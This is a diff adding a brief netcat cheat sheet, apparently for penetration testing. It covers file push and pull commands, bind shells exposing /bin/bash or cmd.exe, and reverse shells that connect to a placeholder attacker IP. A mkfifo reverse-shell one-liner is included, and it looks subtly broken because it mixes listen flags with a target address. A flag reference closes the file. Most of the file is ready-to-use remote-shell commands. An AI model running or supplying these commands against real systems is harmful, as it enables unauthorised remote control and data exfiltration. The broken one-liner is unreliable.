@@ -1,0 +1,32 @@
+File Transfer:
+Push File -
+nc -lvnp [PORT] > file
+nc -w3 [IP] [PORT] < file
+
+Pull File -
+nc -lvnp [PORT] < file
+nc -w3 [IP] [PORT] > file
+
+Shells:
+Bind Shell -
+Linux @ nc -lvnp [PORT] -e /bin/bash
+Win   @ nc -lvnp [PORT] -e cmd.exe
+
+Reverse Shell -
+Linux @ nc [AttackerIP] [PORT] -e /bin/bash
+Win   @ nc [AttackerIP] [PORT] -e cmd.exe
+
+for wrong versions:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp [IP] [PORT] >/tmp/f
+
+
+
+FLAGS:
+-l listen
+-L listen Harder
+-u UDP
+-p local port
+-e execute program
+-v verbose
+-vv very verbose
+
